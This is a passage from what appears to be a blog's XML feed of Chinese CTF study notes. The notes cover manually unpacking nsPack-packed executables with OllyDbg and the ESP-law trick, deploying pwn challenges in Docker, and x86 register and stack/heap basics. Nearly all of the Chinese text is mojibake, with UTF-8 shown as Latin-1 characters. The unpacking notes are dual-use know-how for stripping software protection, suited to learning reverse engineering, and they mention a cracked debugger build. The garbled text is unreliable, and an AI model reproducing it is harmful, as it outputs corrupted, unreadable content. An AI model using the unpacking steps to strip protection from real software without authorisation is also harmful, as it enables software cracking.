ï¼ˆæŸ¥è¯¢ï¼Œå­˜å‚¨è¿‡ç¨‹ï¼Œäº‹åŠ¡ï¼Œæ¯é¢˜6-8åˆ†ï¼‰</p><p>ä»¥633å¼€å¤´çš„7ä½ç”µè¯æ€ä¹ˆå†™</p>]]></content>
    
    
    <categories>
      
      <category>ä¸“ä¸šå­¦ä¹ </category>
      
    </categories>
    
    
    <tags>
      
      <tag>ä¸“ä¸šå­¦ä¹ </tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>æ‰‹åŠ¨è„±å£³</title>
    <link href="/2020/01/13/%E6%89%8B%E5%8A%A8%E8%84%B1%E5%A3%B3/"/>
    <url>/2020/01/13/%E6%89%8B%E5%8A%A8%E8%84%B1%E5%A3%B3/</url>
    
    <content type="html"><![CDATA[<h2 id="æ‰‹åŠ¨è„±å£³"><a href="#æ‰‹åŠ¨è„±å£³" class="headerlink" title="æ‰‹åŠ¨è„±å£³"></a>æ‰‹åŠ¨è„±å£³</h2><p>å¯åˆ†ä¸ºå‹ç¼©å£³ï¼ˆå¸¸è§çš„æœ‰UPXã€åŒ—æ–—ã€ASDPackã€Npackã€PECompactç­‰ï¼‰å’Œä¿æŠ¤å£³ï¼ˆå¦‚å¼ºå£³Safengineã€VMprotectã€winlicenseã€Themidaç­‰ï¼‰ï¼Œå‹ç¼©å£³ä½œç”¨æ˜¯æŠŠç¨‹åºè¿›è¡Œä½“ç§¯ç¼©å°åŒ–å¤„ç†ï¼Œä¿æŠ¤å£³ä¸»è¦ä½œç”¨æ˜¯æ··æ·†æˆ–åŠ å¯†ä»£ç é˜²æ­¢ä»–äººè¿›è¡Œé€†å‘ç¨‹åºã€ç ´è§£ç¨‹åºã€‚</p><p>æ³¨æ„å³é¢å¯„å­˜å™¨FPUçš„æ˜¾ç¤ºï¼Œå½“æœ‰ä¸”åªæœ‰ESPå’ŒEIPä¸ºçº¢è‰²æ—¶ï¼Œæˆ‘ä»¬å¯ä»¥ç”¨ESPå®šå¾‹äº†</p><p><a href="https://baike.baidu.com/item/esp%E5%AE%9A%E5%BE%8B/840881?fr=aladdin#1">ESPå®šå¾‹</a></p><p><a href="https://www.cnblogs.com/ichunqiu/p/6213852.html">å‚è€ƒ</a></p><h3 id="nsPack"><a href="#nsPack" class="headerlink" title="nsPack"></a>nsPack</h3><p>è¿˜è¦æ‰¾åˆ°OEPï¼Œæ‰€è°“çš„OEPï¼Œæ„å³ç¨‹åºçš„å…¥å£ç‚¹ï¼Œå¯ä»¥ç”¨ODè½½å…¥ï¼Œä¸åˆ†æä»£ç ã€‚</p><p>é¦–å…ˆå·²çŸ¥æ˜¯nSPackå£³ï¼Œç›´æ¥ç”¨ODæ‰“å¼€ï¼Œå‘ç°pushfdå’Œpushadä¸¤å¥å…³é”®å¥ï¼š==winä¸‹çš„å¾çˆ±ç ´è§£ç‰ˆodå¯==<img src="/2020/01/13/%E6%89%8B%E5%8A%A8%E8%84%B1%E5%A3%B3/image-20190820143025540.png" class="" title="image-20190820143025540"></p><p>ESPå®šå¾‹çš„è½è„šç‚¹ï¼Œå¯ä»¥çœ‹åˆ°è½è„šç‚¹ä¸‹é¢ä¸€è¡Œå°±æ˜¯ä¸€ä¸ªå¤§è·³è½¬ï¼Œç»§ç»­F8</p><img src="/2020/01/13/%E6%89%8B%E5%8A%A8%E8%84%B1%E5%A3%B3/image-20190820143113466.png" class="" title="image-20190820143113466"><img src="/2020/01/13/%E6%89%8B%E5%8A%A8%E8%84%B1%E5%A3%B3/image-20190820143126509.png" class="" title="image-20190820143126509"><img src="/2020/01/13/%E6%89%8B%E5%8A%A8%E8%84%B1%E5%A3%B3/image-20190820143150130.png" class="" title="image-20190820143150130"><img src="/2020/01/13/%E6%89%8B%E5%8A%A8%E8%84%B1%E5%A3%B3/image-20190820143211831.png" class="" title="image-20190820143211831">]]></content>
    
    
    <categories>
      
      <category>CTF</category>
      
      <category>å¤‡å¿˜</category>
      
    </categories>
    
    
  </entry>
  
  
  
  <entry>
    <title>ä½¿ç”¨dockerä¸ºpwné¢˜ç›®æ­é…ç¯å¢ƒ</title>
    <link href="/2020/01/13/%E4%BD%BF%E7%94%A8docker%E4%B8%BApwn%E9%A2%98%E7%9B%AE%E6%90%AD%E9%85%8D%E7%8E%AF%E5%A2%83/"/>
    <url>/2020/01/13/%E4%BD%BF%E7%94%A8docker%E4%B8%BApwn%E9%A2%98%E7%9B%AE%E6%90%AD%E9%85%8D%E7%8E%AF%E5%A2%83/</url>
    
    <content type="html"><![CDATA[<h2 id="å°†å¤šä¸ªé¢˜ç›®æ­å»ºä¸€ä¸ªdockeré‡Œ"><a href="#å°†å¤šä¸ªé¢˜ç›®æ­å»ºä¸€ä¸ªdockeré‡Œ" class="headerlink" title="å°†å¤šä¸ªé¢˜ç›®æ­å»ºä¸€ä¸ªdockeré‡Œ"></a>å°†å¤šä¸ªé¢˜ç›®æ­å»ºä¸€ä¸ªdockeré‡Œ</h2><p>ubuntu *1 </p><p>docker <a href="https://www.runoob.com/docker/ubuntu-docker-install.html">å®‰è£…</a></p><p>docker-compose <a href="https://docs.docker.com/compose/install/">å®˜æ–¹æ–‡æ¡£</a></p><p><a href="https://github.com/giantbranch/pwn_deploy_chroot">giantbranch/pwn_deploy_chroot</a></p><p><a href="https://blog.csdn.net/xiojing825/article/details/79494408">è§£å†³ ERROR: Couldnâ€™t connect to Docker daemon at http+docker://localunixsocket - is it running?</a></p><p><a href="https://www.awaimai.com/2587.html">docker-compose upè§£å†³é”™è¯¯ERROR: Couldnâ€™t connect to Docker daemon at http+docker://localunixsocket - is it running?</a></p><blockquote><h3 id=""><a href="#" class="headerlink" title=""></a></h3><p>å°†é¢˜ç›®æ”¾åˆ°binç›®å½•ä¸­</p><p>ç„¶ååœ¨config.pyï¼Œå°†REPLACE_BINSHè®¾ç½®ä¸ºFalse</p><p>è¿è¡Œä¸€æ¬¡python initialize.py</p><p>ç„¶åä¼šå‡ºç°ä¸€ä¸ªflags.txtï¼ˆå¦‚æœæƒ³æ›¿æ¢flagï¼Œå°±ç›´æ¥ä¿®æ”¹flag.txté‡Œçš„flagå­—ç¬¦ä¸²å³å¯ï¼Œç„¶åè¿è¡Œä¸€æ¬¡python initialize.pyï¼‰</p><p>ç„¶åè¿è¡Œ docker-compose up -build -d</p><p>å¼€å¯é¢˜ç›®å³å¯</p><p>æ³¨æ„ï¼šè‹¥å‡ºç°libstdc++.so.6æ‰¾ä¸åˆ°çš„æƒ…å†µï¼Œè¯´æ˜C++ç¯å¢ƒæ²¡æœ‰é…å¥½ï¼Œåªéœ€è¦åœ¨å·²ç»é…å¥½C++ç¯å¢ƒçš„åŒç‰ˆæœ¬ubuntuä¸‹æ‰¾åˆ°libstdc++.so.6.0.XXï¼ˆXXä¸ºæ•°å­—ï¼‰å’Œlibgcc_s.so.1æ”¾åˆ°pwn_deploy_chrootç›®å½•ä¸‹ï¼Œç„¶ååœ¨dockerfileé‡ŒåŠ å…¥ä¸€ä¸‹ä»£ç </p><figure class="highlight gradle"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs gradle">&gt;<span class="hljs-keyword">COPY</span> .<span class="hljs-regexp">/libstdc++.so.6.0.21 /u</span>sr<span class="hljs-regexp">/lib/</span>libstdc++.so.<span class="hljs-number">6</span><br>&gt;<span class="hljs-keyword">COPY</span> .<span class="hljs-regexp">/libgcc_s.so.1 /u</span>sr<span class="hljs-regexp">/lib/</span>libgcc_s.so.<span class="hljs-number">1</span><br></code></pre></td></tr></table></figure><p>æ¥æº:<a href="https://196011564.github.io/2019/07/22/Linux-ç®€å•PWNæ­å»º/?tdsourcetag=s_pctim_aiomsg#æ‰¾åˆ°Pwnæ‰€åœ¨çš„ç«¯å£">å’²å¤œå—æ¢¦</a></p></blockquote><p>åœæ­¢å®¹å™¨ docker stop name</p><h2 id="ä¸€ä¸ªé¢˜ç›®ä¸€ä¸ªdocker"><a href="#ä¸€ä¸ªé¢˜ç›®ä¸€ä¸ªdocker" class="headerlink" title="ä¸€ä¸ªé¢˜ç›®ä¸€ä¸ªdocker"></a>ä¸€ä¸ªé¢˜ç›®ä¸€ä¸ªdocker</h2><p><a href="https://github.com/glzjin/base_pwn_xinetd">ubuntu16</a></p><p><a href="https://github.com/glzjin/base_pwn_xinetd_kafel_1804">ubuntu18</a></p><p>ä¸€èˆ¬æƒ…å†µä¸‹ï¼Œä½¿ç”¨èµµå¸ˆå‚…Ubuntu18.04ç¯å¢ƒçš„dockeré•œåƒ</p><p>ä¸‹è½½ä¸‹æ¥ä¹‹åï¼Œåˆ é™¤é™¤äº†æ–‡ä»¶å¤¹ï¼šsrcï¼Œæ–‡ä»¶ï¼šdocker-compose.ymlï¼ŒDockerfileä»¥å¤–çš„æ‰€æœ‰æ–‡ä»¶ï¼Œå¹¶å¤åˆ¶å¤šä¸ªä»¥ä¾›å…¶å®ƒé¢˜ç›®ä½¿ç”¨</p>]]></content>
    
    
    <categories>
      
      <category>CTF</category>
      
      <category>è¿ç»´</category>
      
    </categories>
    
    
  </entry>
  
  
  
  <entry>
    <title>æ±‡ç¼–ã€é€†å‘å·¥ç¨‹åŸºç¡€</title>
    <link href="/2020/01/13/%E6%B1%87%E7%BC%96%E3%80%81%E9%80%86%E5%90%91%E5%B7%A5%E7%A8%8B%E5%9F%BA%E7%A1%80/"/>
    <url>/2020/01/13/%E6%B1%87%E7%BC%96%E3%80%81%E9%80%86%E5%90%91%E5%B7%A5%E7%A8%8B%E5%9F%BA%E7%A1%80/</url>
    
    <content type="html"><![CDATA[<p>åŸæ–‡é“¾æ¥ï¼š<a href="https://blog.csdn.net/qq_21508727/article/details/80559270">https://blog.csdn.net/qq_21508727/article/details/80559270</a></p><h2 id="å•ä½"><a href="#å•ä½" class="headerlink" title="å•ä½"></a>å•ä½</h2><blockquote><ol><li>Â·WORDï¼ˆå­—ï¼‰ - ä¸€ä¸ªå­—ç”±ä¸¤ä¸ªå­—èŠ‚ç»„æˆï¼Œå…±æœ‰16ä½ã€‚ä¸€ä¸ªå­—çš„æœ€å¤§å€¼æ˜¯0FFFFh (æˆ–è€…æ˜¯ 65535d) (hä»£è¡¨16è¿›åˆ¶ï¼Œdä»£è¡¨10è¿›åˆ¶)ã€‚</li><li>Â·DOUBLE WORDï¼ˆåŒå­—DWORDï¼‰ - ä¸€ä¸ªåŒå­—åŒ…å«ä¸¤ä¸ªå­—ï¼Œå…±æœ‰32ä½ã€‚æœ€å¤§å€¼ä¸º0FFFFFFFF (æˆ–è€…æ˜¯ 4294967295d)ã€‚</li></ol><blockquote><p>ä¸€ä¸ª16è¿›åˆ¶å 4bit</p></blockquote></blockquote><h2 id="å¯„å­˜å™¨"><a href="#å¯„å­˜å™¨" class="headerlink" title="å¯„å­˜å™¨"></a>å¯„å­˜å™¨</h2><p>Win+Intel CPUç»„æˆçš„è®¡ç®—æœºé€šå¸¸æœ‰9ä¸ª32ä½å¯„å­˜å™¨ (w/o æ ‡å¿—å¯„å­˜å™¨)ã€‚å®ƒä»¬æ˜¯ï¼š</p><blockquote><ol><li>EAXï¼š ç´¯åŠ å™¨</li><li>EBXï¼š åŸºå€å¯„å­˜å™¨</li><li>ECXï¼š è®¡æ•°å™¨</li><li>EDXï¼š æ•°æ®å¯„å­˜å™¨</li><li>ESIï¼š æºå˜å€å¯„å­˜å™¨</li><li>EDIï¼š ç›®çš„å˜å€å¯„å­˜å™¨</li><li>EBPï¼š æ‰©å±•åŸºå€æŒ‡é’ˆå¯„å­˜å™¨</li><li>ESPï¼š æ ˆæŒ‡é’ˆå¯„å­˜å™¨</li><li>EIPï¼š æŒ‡ä»¤æŒ‡é’ˆå¯„å­˜å™¨</li></ol><blockquote><p>==å¤§å°éƒ½æ˜¯4ä¸ªå­—èŠ‚==</p><blockquote><ol><li><p>EBPï¼š EBPåœ¨æ ˆä¸­è¿ç”¨æœ€å¹¿ï¼Œåˆšå¼€å§‹æ²¡æœ‰ä»€ä¹ˆéœ€è¦ç‰¹åˆ«æ³¨æ„çš„ ;) </p></li><li><p>ESPï¼š ESPæŒ‡å‘æ ˆåŒºåŸŸçš„æ ˆé¡¶ä½ç½®ã€‚æ ˆæ˜¯ä¸€ä¸ªå­˜æ”¾å³å°†ä¼šè¢«ç”¨åˆ°çš„æ•°æ®çš„åœ°æ–¹ï¼Œä½ å¯ä»¥å»æœç´¢ä¸€ä¸‹push/pop æŒ‡ä»¤äº†è§£æ›´å¤šæ ˆçŸ¥è¯†ã€‚ </p></li><li><p>EIPï¼š EIPæŒ‡å‘ä¸‹ä¸€ä¸ªå°†ä¼šè¢«æ‰§è¡Œçš„æŒ‡ä»¤ã€‚</p></li></ol><hr><p><strong>æ ˆï¼ˆstackï¼‰ï¼šåè¿›å…ˆå‡ºçš„æ•°æ®ç»“æ„</strong>     </p><p><strong>å †ï¼ˆheapï¼‰ï¼šç»è¿‡æ’åˆ—çš„æ ‘å½¢æ•°æ®ç»“æ„ï¼Œé€šå¸¸æŒ‡äºŒå‰å †ï¼Œå­˜å–æ˜¯éšæ„çš„</strong></p></blockquote></blockquote></blockquote><p>æœ‰ä¸€äº›å¯„å­˜å™¨æ˜¯16ä½ç”šè‡³8ä½çš„ï¼Œæ˜¯ä¸èƒ½ç›´æ¥å¯»å€çš„ã€‚</p><blockquote><img src="/2020/01/13/%E6%B1%87%E7%BC%96%E3%80%81%E9%80%86%E5%90%91%E5%B7%A5%E7%A8%8B%E5%9F%BA%E7%A1%80/1565342053303.png" class="" width="1565342053303"></blockquote><p>ä¸€ä¸ªå¯„å­˜å™¨å¯ä»¥è¿™æ ·çœ‹ï¼š</p><img src="/2020/01/13/%E6%B1%87%E7%BC%96%E3%80%81%E9%80%86%E5%90%91%E5%B7%A5%E7%A8%8B%E5%9F%BA%E7%A1%80/1565342088084.png" class="" width="1565342088084"><p>EAXæ˜¯åå­—ï¼ŒAXæ˜¯ä½16ä½éƒ¨åˆ†ï¼Œåˆåˆ†ä¸ºä½8ä½ALï¼Œé«˜8ä½AH</p><p><strong>äº†è§£ï¼š</strong></p><p>i.å•å­—èŠ‚ï¼ˆ8ä½ï¼‰å¯„å­˜å™¨ï¼š</p><blockquote><ol><li>AL and AH</li><li>BL and BH</li><li>CL and CH</li><li>DL and DH</li></ol></blockquote><p>ii.å•å­—ï¼ˆ16ä½ï¼‰å¯„å­˜å™¨ï¼šè¿™äº›å¯„å­˜å™¨å¤§å°ä¸ºä¸€ä¸ªå­—ï¼ˆ=2å­—èŠ‚=16ä½ï¼‰ã€‚ä¸€ä¸ªå•å­—å¯„å­˜å™¨åŒ…å«ä¸¤ä¸ªå•å­—èŠ‚å¯„å­˜å™¨ã€‚é€šå¸¸æ ¹æ®åŠŸèƒ½åŒºåˆ†</p><p>1.é€šç”¨å¯„å­˜å™¨:</p><blockquote><ol><li>AX (å•å­—=16ä½) = AH + AL -&gt; å…¶ä¸­â€˜+â€™å·å¹¶ä¸ä»£è¡¨æŠŠå®ƒä»¬ä»£æ•°ç›¸åŠ ã€‚AHå’ŒALå¯„å­˜å™¨æ˜¯ç›¸äº’ç‹¬ç«‹çš„ï¼Œåªä¸è¿‡éƒ½æ˜¯AXå¯„å­˜å™¨çš„ä¸€éƒ¨åˆ†ï¼Œæ‰€ä»¥ä½ æ”¹å˜AHæˆ–AL (æˆ–è€…éƒ½æ”¹å˜) ï¼ŒAXå¯„å­˜å™¨ä¹Ÿä¼šè¢«æ”¹å˜ã€‚ </li><li>-&gt; â€˜accumulatorâ€™(ç´¯åŠ å™¨)ï¼šç”¨äºè¿›è¡Œæ•°å­¦è¿ç®—</li><li>BX -&gt; â€˜baseâ€™(åŸºå€å¯„å­˜å™¨)ï¼šç”¨æ¥è¿æ¥æ ˆ(ä¹‹åä¼šè¯´æ˜)</li><li>CX -&gt; â€˜counterâ€™(è®¡æ•°å™¨)ï¼š</li><li>DX -&gt; â€˜dataâ€™(æ•°æ®å¯„å­˜å™¨)ï¼šå¤§å¤šæ•°æƒ…å†µä¸‹ç”¨æ¥å­˜æ”¾æ•°æ®</li><li>DI -&gt; â€˜destination indexâ€™(ç›®çš„å˜å€å¯„å­˜å™¨): ä¾‹å¦‚å°†ä¸€ä¸ªå­—ç¬¦ä¸²æ‹·è´åˆ°DI</li><li>SI -&gt; â€˜source indexâ€™(æºå˜å€å¯„å­˜å™¨): ä¾‹å¦‚å°†ä¸€ä¸ªå­—ç¬¦ä¸²ä»SIæ‹·è´</li></ol></blockquote><p>2.ç´¢å¼•å¯„å­˜å™¨ï¼ˆæŒ‡é’ˆå¯„å­˜å™¨ï¼‰:</p><blockquote><ol><li>BP -&gt; â€˜base pointerâ€™(åŸºå€æŒ‡é’ˆå¯„å­˜å™¨)ï¼šè¡¨ç¤ºæ ˆåŒºåŸŸçš„åŸºåœ°å€</li><li>SP -&gt; â€˜stack pointerâ€™(æ ˆæŒ‡é’ˆå¯„å­˜å™¨)ï¼šè¡¨ç¤ºæ ˆåŒºåŸŸçš„æ ˆé¡¶åœ°å€</li></ol></blockquote><p>3.æ®µå¯„å­˜å™¨ï¼š</p><blockquote><ol><li>CS -&gt; â€˜code segmentâ€™(ä»£ç æ®µå¯„å­˜å™¨)ï¼šç”¨äºå­˜æ”¾åº”ç”¨ç¨‹åºä»£ç æ‰€åœ¨æ®µçš„æ®µåŸºå€(ä¹‹åä¼šè¯´æ˜)</li><li>DS -&gt; â€˜data segmentâ€™(æ•°æ®æ®µå¯„å­˜å™¨)ï¼šç”¨äºå­˜æ”¾æ•°æ®æ®µçš„æ®µåŸºå€(ä»¥åä¼šè¯´æ˜)</li><li>ES -&gt; â€˜extra segmentâ€™(é™„åŠ æ®µå¯„å­˜å™¨)ï¼šç”¨äºå­˜æ”¾ç¨‹åºä½¿ç”¨çš„é™„åŠ æ•°æ®æ®µçš„åŸºåœ°å€</li><li>SS -&gt; â€˜stack segmentâ€™(æ ˆæ®µå¯„å­˜å™¨)ï¼šç”¨äºå­˜æ”¾æ ˆæ®µçš„æ®µåŸºå€(ä»¥åä¼šè¯´æ˜)</li></ol></blockquote><p>4.æŒ‡ä»¤æŒ‡é’ˆå¯„å­˜å™¨ï¼š</p><blockquote><p>IP -&gt; â€˜instruction pointerâ€™(æŒ‡ä»¤æŒ‡é’ˆå¯„å­˜å™¨)ï¼šæŒ‡å‘ä¸‹ä¸€ä¸ªæŒ‡ä»¤ ;)</p></blockquote><p>iii. åŒå­—(32ä½)å¯„å­˜å™¨ï¼š</p><p>2 å­—= 4 å­—èŠ‚= 32 ä½ï¼Œ EAXã€EBXã€ECXã€EDXã€EDIâ€¦â€¦ </p><p>å¦‚æœ16ä½å¯„å­˜å™¨å‰é¢åŠ äº†â€˜Eâ€™ï¼Œå°±ä»£è¡¨å®ƒä»¬æ˜¯32ä½å¯„å­˜å™¨ã€‚ä¾‹å¦‚ï¼ŒAX=16ä½ï¼ŒEAX=32ä½ã€‚</p><h2 id="æ ‡å¿—å¯„å­˜å™¨"><a href="#æ ‡å¿—å¯„å­˜å™¨" class="headerlink" title="æ ‡å¿—å¯„å­˜å™¨"></a>æ ‡å¿—å¯„å­˜å™¨</h2><p>32ä½çš„CPUä¸­æœ‰32ä¸ªä¸åŒçš„æ ‡å¿—å¯„å­˜å™¨ï¼Œåªå…³å¿ƒæœŸä¸­ä¸‰ä¸ªï¼šZFã€OFã€CFã€‚æ ‡å¿—å¯„å­˜å™¨æ˜¯ä¸€ä¸ªæ ‡å¿—ï¼Œ==åªèƒ½æ˜¯0æˆ–è€…1ï¼Œå†³å®šäº†æ˜¯å¦è¦æ‰§è¡ŒæŸä¸ªæŒ‡ä»¤==ï¼Œå¯ä»¥çŸ¥é“ç¨‹åºåœ¨è¿™ä¸€æ­¥æ˜¯å¦ä¼šè·³è½¬ã€‚</p><h3 id="Z-Flagï¼ˆé›¶æ ‡å¿—ï¼‰"><a href="#Z-Flagï¼ˆé›¶æ ‡å¿—ï¼‰" class="headerlink" title="Z-Flagï¼ˆé›¶æ ‡å¿—ï¼‰"></a>Z-Flagï¼ˆé›¶æ ‡å¿—ï¼‰</h3><p>ZFæ˜¯ç ´è§£ä¸­ç”¨çš„æœ€å¤šçš„å¯„å­˜å™¨ï¼ˆé€šå¸¸90%ï¼‰ã€‚è‹¥ä¸Šä¸€ä¸ªè¿ç®—ç»“æœä¸º0ï¼Œåˆ™å€¼ä¸º1ï¼Œå¦åˆ™ä¸º0ã€‚</p><h3 id="The-O-Flagï¼ˆæº¢å‡ºæ ‡å¿—ï¼‰"><a href="#The-O-Flagï¼ˆæº¢å‡ºæ ‡å¿—ï¼‰" class="headerlink" title="The O-Flagï¼ˆæº¢å‡ºæ ‡å¿—ï¼‰"></a>The O-Flagï¼ˆæº¢å‡ºæ ‡å¿—ï¼‰</h3><p>OFå çº¦4%ï¼Œè‹¥ä¸Šä¸€æ­¥æ”¹å˜äº†æŸå¯„å­˜å™¨çš„æœ€é«˜æœ‰æ•ˆä½ï¼Œåˆ™ä¼šè¢«è®¾ç½®ä¸º1ã€‚æ“ä½œäº§ç”Ÿæº¢å‡ºæ—¶ä¹Ÿä¼šè¢«è®¾ç½®ä¸º1ã€‚</p><h3 id="The-C-Flagï¼ˆè¿›ä½æ ‡å¿—ï¼‰"><a href="#The-C-Flagï¼ˆè¿›ä½æ ‡å¿—ï¼‰" class="headerlink" title="The C-Flagï¼ˆè¿›ä½æ ‡å¿—ï¼‰"></a>The C-Flagï¼ˆè¿›ä½æ ‡å¿—ï¼‰</h3><p>CFå 1%ï¼Œäº§ç”Ÿæº¢å‡ºï¼Œå°±ä¼šè¢«è®¾ç½®ä¸º1ã€‚</p><h2 id="æ®µåç§»"><a href="#æ®µåç§»" class="headerlink" title="æ®µåç§»"></a>æ®µåç§»</h2><p>å†…å­˜ä¸­çš„ä¸€ä¸ªæ®µå‚¨å­˜äº†æŒ‡ä»¤ï¼ˆCSï¼‰ã€æ•°æ®ï¼ˆDSï¼‰ã€å †æ ˆï¼ˆSSï¼‰æˆ–è€…å…¶ä»–æ®µï¼ˆESï¼‰ã€‚æ¯ä¸€ä¸ªæ®µéƒ½æœ‰ä¸€ä¸ªåç§»é‡ï¼Œåœ¨32ä½åº”ç”¨ç¨‹åºä¸‹ï¼Œè¿™äº›åç§»é‡ç”±00000000åˆ°FFFFFFFFã€‚æ®µå’Œåç§»é‡çš„æ ‡å‡†å½¢å¼å¦‚ä¸‹ï¼š</p><blockquote><p>æ®µï¼šåç§»é‡ = æŠŠå®ƒä»¬æ”¾åœ¨ä¸€èµ·å°±æ˜¯å†…å­˜ä¸­ä¸€ä¸ªå…·ä½“çš„åœ°å€ã€‚</p><p>æ¯”å–»ï¼šä¸€ä¸ªæ®µæ˜¯ä¸€æœ¬ä¹¦çš„æŸä¸€é¡µï¼›åç§»é‡æ˜¯ä¸€é¡µçš„æŸä¸€è¡Œã€‚</p></blockquote><h2 id="å †å’Œæ ˆ"><a href="#å †å’Œæ ˆ" class="headerlink" title="å †å’Œæ ˆ"></a>å †å’Œæ ˆ</h2><p><strong>å†…å­˜ä¸­çš„æ ˆåŒºå¤„äºç›¸å¯¹è¾ƒé«˜çš„åœ°å€ä»¥åœ°å€çš„å¢é•¿æ–¹å‘ä¸ºä¸Šçš„è¯ï¼Œæ ˆåœ°å€æ˜¯å‘ä¸‹å¢é•¿çš„ã€‚</strong></p><p>æ ˆä¸­åˆ†é…å±€éƒ¨å˜é‡ç©ºé—´ï¼Œå †åŒºæ˜¯å‘ä¸Šå¢é•¿çš„ç”¨äºåˆ†é…ç¨‹åºå‘˜ç”³è¯·çš„å†…å­˜ç©ºé—´ã€‚å¦å¤–è¿˜æœ‰é™æ€åŒºæ˜¯åˆ†é…é™æ€å˜é‡ï¼Œå…¨å±€å˜é‡ç©ºé—´çš„ï¼›åªè¯»åŒºæ˜¯åˆ†é…å¸¸é‡å’Œç¨‹åºä»£ç ç©ºé—´çš„ï¼›ä»¥åŠå…¶ä»–ä¸€äº›åˆ†åŒºã€‚</p><blockquote><p>PUSH å‘½ä»¤æ˜¯å‘æ ˆä¸­å‹å…¥æ•°æ®ï¼ŒPOPå‘½ä»¤å°±æ˜¯ä»æ ˆä¸­å–å‡ºæœ€åæ”¾å…¥çš„æ•°æ®å¹¶ä¸”æŠŠå®ƒå­˜è¿›å…·ä½“çš„å¯„å­˜å™¨ä¸­ã€‚</p></blockquote><h3 id="1ã€å †å’Œæ ˆç”³è¯·å’Œå›æ”¶æ–¹å¼ä¸åŒ"><a href="#1ã€å †å’Œæ ˆç”³è¯·å’Œå›æ”¶æ–¹å¼ä¸åŒ" class="headerlink" title="1ã€å †å’Œæ ˆç”³è¯·å’Œå›æ”¶æ–¹å¼ä¸åŒ"></a>1ã€å †å’Œæ ˆç”³è¯·å’Œå›æ”¶æ–¹å¼ä¸åŒ</h3><ul><li>æ ˆï¼šç”±ç³»ç»Ÿè‡ªåŠ¨åˆ†é…ç©ºé—´ï¼Œè‡ªåŠ¨å›æ”¶</li><li>å †ï¼šç”±ç¨‹åºå‘˜è‡ªå·±ç”³è¯·ç©ºé—´ï¼Œä¸é‡Šæ”¾å°±å¯ä»¥ä¸€ç›´è®¿é—®</li></ul><h3 id="2ã€ç”³è¯·åç³»ç»Ÿå“åº”"><a href="#2ã€ç”³è¯·åç³»ç»Ÿå“åº”" class="headerlink" title="2ã€ç”³è¯·åç³»ç»Ÿå“åº”"></a>2ã€ç”³è¯·åç³»ç»Ÿå“åº”</h3><ul><li>æ ˆï¼šåªè¦æ ˆå‰©ä½™ç©ºé—´,å°±è‡ªåŠ¨åˆ†é…ç©ºé—´ï¼Œå¦åˆ™æç¤ºæ ˆæº¢å‡º</li><li>å †ï¼š==æ“ä½œç³»ç»Ÿæœ‰ä¸€ä¸ªè®°å½•ç©ºé—²å†…å­˜åœ°å€çš„é“¾è¡¨==ï¼Œç³»ç»Ÿæ”¶åˆ°ç©ºé—´ç”³è¯·ä¼šéå†è¯¥é“¾è¡¨ï¼Œå¯»æ‰¾ç¬¬ä¸€ä¸ªå¤§äºç”³è¯·ç©ºé—´çš„ç»“ç‚¹ã€‚å¹¶å°†ç»“ç‚¹ä»ç©ºé—²ç»“ç‚¹é“¾è¡¨åˆ é™¤ï¼Œå°†ç©ºé—´åˆ†é…ç»™ç¨‹åºã€‚==åœ¨è¿™å—å†…å­˜ç©ºé—´çš„é¦–åœ°å€ä¼šè®°å½•åˆ†é…ç©ºé—´çš„å¤§å°ï¼Œæ‰€ä»¥deleteæ‰èƒ½æ­£ç¡®é‡Šæ”¾ç©ºé—´ã€‚==å¤šä½™ç©ºé—´ä¼šæ”¾å›ç©ºé—²é“¾è¡¨ã€‚ </li></ul><h3 id="3ã€å †ç”³è¯·æ•ˆç‡æ¯”æ ˆä½"><a href="#3ã€å †ç”³è¯·æ•ˆç‡æ¯”æ ˆä½" class="headerlink" title="3ã€å †ç”³è¯·æ•ˆç‡æ¯”æ ˆä½"></a>3ã€å †ç”³è¯·æ•ˆç‡æ¯”æ ˆä½</h3><h3 id="4ã€ç”³è¯·å¤§å°çš„é™åˆ¶"><a href="#4ã€ç”³è¯·å¤§å°çš„é™åˆ¶" class="headerlink" title="4ã€ç”³è¯·å¤§å°çš„é™åˆ¶"></a>4ã€ç”³è¯·å¤§å°çš„é™åˆ¶</h3><ul><li>æ ˆï¼šWinä¸‹ï¼Œæ ˆæ˜¯==è¿ç»­çš„å†…å­˜åŒºåŸŸ==ï¼Œ==å‘ä½åœ°å€æ‰©å±•çš„æ•°æ®ç»“æ„ã€‚æ ˆé¡¶åœ°å€å’Œæ ˆçš„æœ€å¤§å®¹é‡æ˜¯ç³»ç»Ÿé¢„å…ˆè§„å®šå¥½çš„ã€‚==Winä¸‹æ ˆå¤§å°ä¸º1Mï¼Œç”³è¯·ç©ºé—´è¶…å‡ºå‰©ä½™ä¼šæç¤ºoverflowã€‚</li><li>å †ï¼šå‘é«˜åœ°å€æ‹“å±•çš„æ•°æ®ç»“æ„ï¼Œä¸è¿ç»­çš„å†…å­˜åŒºåŸŸã€‚ï¼ˆå› ä¸ºç”¨é“¾è¡¨å‚¨å­˜ï¼‰<strong>é“¾è¡¨éå†ä»ä½åœ°å€åˆ°é«˜åœ°å€ã€‚</strong>å †çš„å¤§å°å—é™äºè®¡ç®—æœºç³»ç»Ÿä¸­æœ‰æ•ˆçš„è™šæ‹Ÿå†…å­˜ã€‚</li></ul><h3 id="5ã€å †å’Œæ ˆä¸­çš„å­˜å‚¨å†…å®¹"><a href="#5ã€å †å’Œæ ˆä¸­çš„å­˜å‚¨å†…å®¹" class="headerlink" title="5ã€å †å’Œæ ˆä¸­çš„å­˜å‚¨å†…å®¹"></a>5ã€å †å’Œæ ˆä¸­çš„å­˜å‚¨å†…å®¹</h3><ul><li>æ ˆå¤§å°æœ‰é™ï¼Œç”¨å­å‡½æ•°æœ‰ç‰©ç†æ„ä¹‰ï¼ˆï¼Ÿï¼Ÿï¼Ÿï¼‰</li><li>æ ˆï¼šè°ƒç”¨å‡½æ•°æ—¶ï¼Œç¬¬ä¸€ä¸ªè¿›æ ˆçš„æ˜¯ä¸»å‡½æ•°ä¸­å‡½æ•°è°ƒç”¨åçš„ä¸‹ä¸€æ¡æŒ‡ä»¤ï¼ˆä¸‹ä¸€æ¡å¯æ‰§è¡Œè¯­å¥ï¼‰==çš„åœ°å€==ï¼Œç„¶åæ˜¯å‡½æ•°çš„å„ä¸ªå‚æ•°ï¼Œåœ¨å¤§å¤šæ•°Cç¼–è¯‘å™¨ä¸­ï¼Œå‚æ•°æ˜¯ç”±å³å¾€å·¦å…¥æ 